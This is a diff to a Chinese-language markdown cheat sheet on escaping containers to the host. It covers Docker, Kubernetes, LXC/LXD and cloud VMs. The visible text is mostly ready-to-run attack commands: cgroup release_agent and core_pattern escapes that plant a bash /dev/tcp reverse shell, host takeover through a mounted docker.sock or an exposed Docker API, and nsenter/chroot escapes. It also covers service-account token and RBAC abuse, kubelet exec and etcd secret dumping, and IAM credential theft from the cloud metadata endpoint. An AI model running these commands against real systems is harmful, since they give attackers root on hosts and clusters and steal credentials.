@@ -11,7 +11,7 @@ metadata: { domain: linux, tier: T1 }
 
 ## 0. 容器检测
 
-```
+```text
 [ ] ls -la /.dockerenv                        # Docker 标志文件
 [ ] cat /proc/1/cgroup | grep -i 'docker\|lxc\|kubepods\|libpod'
 [ ] cat /proc/1/environ | tr '\0' '\n'
@@ -20,7 +20,7 @@ metadata: { domain: linux, tier: T1 }
 [ ] hostname → 是否 HEX 字符串 (Docker 默认)
 [ ] ip a → 是否有 docker0/cni0/flannel 网桥
 [ ] ls /var/run/secrets/kubernetes.io/        # K8s Service Account token
-```
+```text
 → 非容器沙箱 (snap/flatpak/firejail) → 详见 noncontainer-sandbox-escape 卡
 
 ---
@@ -29,7 +29,7 @@ metadata: { domain: linux, tier: T1 }
 
 ### 1.1 Privileged 容器 🔴 最优先
 
-```
+```text
 # 检测: capsh --print | grep -q cap_sys_admin
 # 有 SYS_ADMIN → 以下全部可行
 
@@ -48,18 +48,18 @@ echo 1 > /tmp/cgrp/x/notify_on_release
 # 🔴 release_agent 需要宿主机路径！写脚本到容器根目录 /cmd，宿主机路径 = upperdir/cmd
 host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
-echo '#!/bin/bash' > /cmd                 # 🔴 必须是 bash!/bin/sh 不支持 /dev/tcp
+echo '#!/bin/bash' > /cmd                 # 🔴 必须是 bash！/bin/sh 不支持 /dev/tcp
 echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /cmd
 chmod +x /cmd
 # 触发: sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
 # 方法 3: nsenter 直接进宿主机 namespace
 nsenter --target 1 --mount --uts --ipc --net --pid -- bash
-```
+```text
 
 ### 1.2 Docker Socket 挂载
 
-```
+```text
 [ ] ls /var/run/docker.sock → 存在 → 🎯 完全控制 Docker
     docker -H unix:///var/run/docker.sock ps
     docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
@@ -67,11 +67,11 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 [ ] 通过 Docker API (TCP:2375/2376)
     curl http://IP:2375/containers/json
     docker -H tcp://IP:2375 run -v /:/host -it alpine chroot /host
-```
+```text
 
 ### 1.3 Capabilities 滥用
 
-```
+```text
 [ ] capsh --print
 
 # CAP_SYS_ADMIN → mount / cgroup / nsenter (见 1.1)
@@ -79,11 +79,11 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 # CAP_SYS_MODULE → insmod 内核模块
 # CAP_NET_RAW    → ARP 欺骗宿主机
 # CAP_DAC_READ_SEARCH → 绕过文件读权限
-```
+```text
 
 ### 1.4 共享 Namespace
 
-```
+```text
 # host pid namespace
 [ ] ls /proc/ → 能看到宿主机进程? → nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 
@@ -92,28 +92,28 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 
 # host IPC
 [ ] ipcs -a → 能看到宿主机共享内存?
-```
+```text
 
 ### 1.5 敏感挂载点
 
-```
+```text
 mount | grep -E '/proc|/sys|/var/run|/dev'
 # /proc:/proc (rw) → nsenter 逃逸
 # /:/host → chroot /host
 # /var/run/docker.sock 挂载
-```
+```text
 
 ### 1.6 CVE 逃逸
-```
+```text
 # CVE-2019-5736: runc <1.0-rc6 → 容器内写 /proc/self/exe 覆盖宿主机 runc
 # CVE-2024-21626 (Leaky Vessels): runc WORKDIR fd 泄露 → 宿主机文件访问
 # CVE-2022-0492: cgroup v1 release_agent 无需 CAP_SYS_ADMIN (旧内核未修)
 # CVE-2025-9074: Docker Desktop ≤4.44.2 → 容器内 mount 宿主机资源
 # OverlayFS 内核提权 (CVE-2021-3493 / CVE-2023-0386) → 详见 overlayfs-privesc 卡
-```
+```text
 
 ### 1.7 core_pattern 逃逸 (rw /proc)
-```
+```text
 # 条件: /proc/sys/kernel/core_pattern 可写 + CAP_SYS_ADMIN
 # 🔴 core_pattern 路径必须是宿主机路径！先获取 host_path（同 release_agent）
 host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
@@ -122,16 +122,16 @@ echo '#!/bin/bash' > /pwn.sh
 echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /pwn.sh
 chmod +x /pwn.sh
 # → 触发 core dump: killall -ABRT someproc → 以 root 执行 /pwn.sh
-```
+```text
 
 ### 1.8 /proc/1/root 快捷逃逸
-```
+```text
 # 🔴 前提: hostPID 共享或能找到宿主机进程的 PID
 # 容器内 PID 1 是容器 init → 它的 root 就是容器 root → 不是逃逸
 # hostPID 共享时 → 宿主机 init 在某个 PID → ls /proc/<HOST_INIT_PID>/root/
 ls /proc/1/root/ → 如果显示宿主机 / 而非容器 / ? → chroot /proc/<PID>/root /bin/bash
 # 🔴 Docker 默认 seccomp 可能阻止 chroot → 优先试 release_agent 而非此方法
-```
+```text
 
 ---
 
@@ -139,7 +139,7 @@ ls /proc/1/root/ → 如果显示宿主机 / 而非容器 / ? → chroot /proc/<
 
 ### 2.1 Service Account Token 滥用
 
-```
+```text
 [ ] ls /var/run/secrets/kubernetes.io/serviceaccount/
 [ ] cat /var/run/secrets/kubernetes.io/serviceaccount/token
 
@@ -153,16 +153,16 @@ kubectl get nodes
 
 # RBAC 滥用: 可创建 pod → 挂载宿主机 → 逃逸
 kubectl apply -f evil-pod.yaml
-```
+```text
 
 ### 2.2 K8s RBAC 提权
 
-```
+```text
 [ ] kubectl auth can-i create pods --all-namespaces → yes → 创建特权 pod
 [ ] kubectl auth can-i create roles --all-namespaces → yes → 添加权限
 [ ] kubectl auth can-i get secrets     → yes → 读所有 secrets
 [ ] kubectl auth can-i "*" "*"         → yes → 集群 admin!
-```
+```text
 
 ### 2.3 宿主机逃逸（通过 Pod 创建）
 
@@ -185,48 +185,48 @@ spec:
     hostPath:
       path: /
       type: Directory
-```
+```text
 
 ### 2.4 kubelet API 直接访问
-```
+```text
 # kubelet 默认 10250 端口 — 从 Pod 内访问节点 IP
 curl -k https://<NODE_IP>:10250/pods
 # → 列出所有 pod → 找到目标 pod → exec
 curl -k -XPOST https://<NODE_IP>:10250/run/<NS>/<POD>/<CONTAINER> -d "cmd=id"
 # 🔴 kubelet 未加固 → 直接 exec 任意 pod 的容器
-```
+```text
 
 ### 2.5 ETCD 访问
 
-```
+```text
 [ ] env | grep ETCD → ETCDCTL_ENDPOINTS / certs
     etcdctl --endpoints=<...> get / --prefix --keys-only | grep secrets
     etcdctl get /registry/secrets/<ns>/<secret>
-```
+```text
 
 ---
 
 ## 3. LXC/LXD 逃逸
 
-```
+```text
 [ ] id | grep lxd → LXD 组 → 可创建 privileged 容器 → 挂载宿主机
     lxc init ubuntu:22.04 escape -c security.privileged=true
     lxc config device add escape host disk source=/ path=/mnt/root recursive=true
     lxc start escape; lxc exec escape bash
 
 [ ] 已安装 LXD snap → /snap/bin/lxc
-```
+```text
 
 ---
 
 ## 4. Cloud VM 逃逸（元数据 API）
 
-```
+```text
 # 访问 169.254.169.254 (AWS/GCP/Azure) 元数据端点 → 窃取 IAM 角色凭据 → 横向云资源
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
 # GCP: metadata.google.internal · Azure: 需 Metadata:true 头
 （完整见 cloud-attacks 卡）
-```
+```text
 
 ---
 
